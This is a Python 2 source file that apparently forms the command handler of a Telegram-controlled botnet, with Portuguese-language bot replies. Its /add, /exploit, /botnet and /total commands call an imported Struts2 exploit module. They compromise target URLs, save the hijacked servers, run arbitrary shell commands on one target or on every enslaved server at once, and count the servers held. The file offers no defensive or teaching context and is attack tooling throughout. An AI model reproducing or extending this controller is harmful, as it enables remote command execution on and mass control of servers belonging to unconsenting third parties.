# -*- coding: utf-8 -*-

from plugins.struts2 import struts2

class actions:
    def __init__(self,bot,msg,chat_id):
        self.xpl = struts2()
        self.bot = bot
        self.msg = msg
        self.chat_id = chat_id
        if msg.startswith('/add'):
            self.add()
        elif msg.startswith('/total'):
            self.total()
        elif msg.startswith('/exploit'):
            self.exploit()
        elif msg.startswith('/botnet'):
            self.botnet()

    def add(self,):
            splited = self.msg.split(' ',1)
            if len(splited) < 2:
                self.bot.sendMessage(self.chat_id,'Ta errado essa merda, presta atencao!')
            else:
                url = splited[1]
                print url
                response = self.xpl.add(url)
                if response:
                    self.bot.sendMessage(self.chat_id,'Ownado e salvo com sucesso')
                else:
                    self.bot.sendMessage(self.chat_id,'Mano nem consegui exploitar ein :/')

    def total(self,):
        totalServer = self.xpl.total()
        self.bot.sendMessage(self.chat_id,'Manolo, temos %d servidores na nossa botnet ' % totalServer)

    def exploit(self,):
        splited = self.msg.split(' ',1)
        if len(splited) == 2 and len(splited[1].rsplit('*',1)) == 2:
            url,cmd = splited[1].rsplit('*',1)
            print cmd
            print url
            response = self.xpl.exploit(url,cmd)
            if response:
                self.bot.sendMessage(self.chat_id,response)
            else:
                self.bot.sendMessage(self.chat_id,'Mano deu algum erro, da uma olhada nos logs :/')
        else:
            self.bot.sendMessage(self.chat_id,'Ta errado essa merda, presta atencao!')
    def botnet(self,):
        splited = self.msg.split(' ',1)
        if len(splited) < 2:
            self.bot.sendMessage(self.chat_id,'Ta errado essa merda, presta atencao!')
        else:
            cmd = splited[1]
            totalExec = self.xpl.botnet(cmd)
            totalServer = self.xpl.total()
            self.bot.sendMessage(self.chat_id,'Mano, saca so, o comando que mandou foi executado em %d/%d servidores.' %(totalExec,totalServer))
